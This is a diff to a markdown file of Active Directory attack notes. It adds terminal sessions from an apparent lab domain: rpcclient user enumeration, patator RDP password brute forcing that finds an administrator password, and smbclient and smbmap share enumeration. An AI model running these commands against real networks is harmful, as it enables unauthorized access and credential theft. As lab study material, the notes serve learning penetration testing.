@@ -74,6 +74,31 @@ This is a collection of notes about active directory and (post)exploitation
 
 ## Enum Local users
 
+### rpcclient
+
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ rpcclient -U testuser%Pass123! 192.168.200.100                                                                                                    1 ⨯
+	rpcclient $> enumdomusers
+	user:[Administrator] rid:[0x1f4]
+	user:[Guest] rid:[0x1f5]
+	user:[krbtgt] rid:[0x1f6]
+	user:[danj] rid:[0x451]
+	user:[adamb] rid:[0x452]
+	user:[alans] rid:[0x453]
+	.
+	.
+	.
+	.
+	user:[davidb1] rid:[0x547]
+	user:[roastme] rid:[0x836]
+	user:[kerberoastme] rid:[0x844]
+	user:[testuser] rid:[0x845]
+	user:[dontmindme] rid:[0x847]
+	user:[iwouldmind] rid:[0x848]
+	user:[mrblack] rid:[0x849]
+
+
 ### impacket-lookupsid
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
@@ -91,11 +116,46 @@ This is a collection of notes about active directory and (post)exploitation
 
 ## Bruteforce
 
+### Rdp Brute Force
+
+brute force with less privilege
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ patator rdp_login host=192.168.200.110 user="testuser" password=FILE0 0=pword.txt          
+	11:51:29 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
+	11:51:29 patator    INFO -                                                                              
+	11:51:29 patator    INFO - code  size    time | candidate                          |   num | mesg
+	11:51:29 patator    INFO - -----------------------------------------------------------------------------
+	11:51:30 patator    INFO - 132   32     0.607 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:30 patator    INFO - 132   32     0.609 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:30 patator    INFO - 132   32     0.622 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:30 patator    INFO - 132   32     0.648 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:30 patator    INFO - 131   38     1.434 | Pass123!                           |     5 | ERRINFO_SERVER_INSUFFICIENT_PRIVILEGES
+	11:51:31 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 3 r/s, Time: 0h 0m 1s
+
+
+Brute force with privilege account
+
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ patator rdp_login host=192.168.200.110 user="administrator" password=FILE0 0=pword.txt
+	11:51:16 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
+	11:51:17 patator    INFO -                                                                              
+	11:51:17 patator    INFO - code  size    time | candidate                          |   num | mesg
+	11:51:17 patator    INFO - -----------------------------------------------------------------------------
+	11:51:17 patator    INFO - 132   32     0.639 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:17 patator    INFO - 132   32     0.648 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:17 patator    INFO - 132   32     0.647 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:17 patator    INFO - 132   32     0.653 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
+	11:51:18 patator    INFO - 0     2      1.566 | Pass123!                           |     5 | OK
+	11:51:19 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 2 r/s, Time: 0h 0m 2s
+
+
 
 
 ### Kerbrute
 
-Brute force usernames from DC
+Brute force usernames from DC (There is no log for this scan)
 
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
@@ -117,7 +177,7 @@ Brute force usernames from DC
 
 
 
-Bruteforce password for single user
+Bruteforce password for single user (There is no log for this scan)
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ ./kerbrute bruteuser -d valhalla.local --dc valhalla.local 500.txt testuser   
@@ -167,6 +227,57 @@ Bruteforce password for single user
 
 
 ## Enum Shares
+
+### smbclient
+
+Detect
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ smbclient -L 192.168.200.100 -U valhalla.local/testuser                                                                                           1 ⨯
+	Enter VALHALLA.LOCAL\testuser's password: 
+
+			Sharename       Type      Comment
+			---------       ----      -------
+			ADMIN$          Disk      Remote Admin
+			C$              Disk      Default share
+			IPC$            IPC       Remote IPC
+			NETLOGON        Disk      Logon server share 
+			share           Disk      
+			SYSVOL          Disk      Logon server share 
+	SMB1 disabled -- no workgroup available
+
+
+Connect
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ smbclient \\\\192.168.200.100\\share -U valhalla.local/testuser
+	Enter VALHALLA.LOCAL\testuser's password: 
+	Try "help" to get a list of possible commands.
+	smb: \> ls
+	  .                                   D        0  Sat Aug 14 19:43:34 2021
+	  ..                                  D        0  Sat Aug 14 19:43:34 2021
+	  projectx.txt                        A       24  Sat Aug 14 20:07:25 2021
+
+					15638527 blocks of size 4096. 13126313 blocks available
+	smb: \> get projectx.txt 
+	getting file \projectx.txt of size 24 as projectx.txt (11.7 KiloBytes/sec) (average 11.7 KiloBytes/sec)
+	smb: \> 
+
+
+### smbmap
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ smbmap -H 192.168.200.100 -d valhalla.local -u testuser -p Pass123!
+	[+] IP: 192.168.200.100:445     Name: valhalla.local                                    
+			Disk                                                    Permissions     Comment
+			----                                                    -----------     -------
+			ADMIN$                                                  NO ACCESS       Remote Admin
+			C$                                                      NO ACCESS       Default share
+			IPC$                                                    READ ONLY       Remote IPC
+			NETLOGON                                                READ ONLY       Logon server share 
+			share                                                   READ ONLY
+			SYSVOL                                                  READ ONLY       Logon server share 
+
 
 ### smb_enumshares (Metasploit)
 
